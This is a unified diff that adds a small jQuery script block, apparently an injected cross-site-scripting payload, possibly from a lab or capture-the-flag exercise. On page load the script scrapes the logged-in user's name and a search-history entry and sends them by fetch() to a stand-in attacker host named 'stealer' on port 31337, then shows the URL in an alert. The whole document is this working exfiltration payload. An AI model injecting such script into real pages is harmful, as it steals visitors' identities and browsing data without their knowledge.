@@ -1,0 +1,9 @@
+<script>
+    $(document).ready(function() {
+        let last_searched = $(".history-item,.list-group-item")[1].innerText;
+        let user = $("#logged-in-user")[0].innerText;
+        let url = `http://stealer:31337/?stolen_user=${user}&last_search=${last_searched}`;
+        fetch(url);
+        alert(url);
+    });  
+</script>
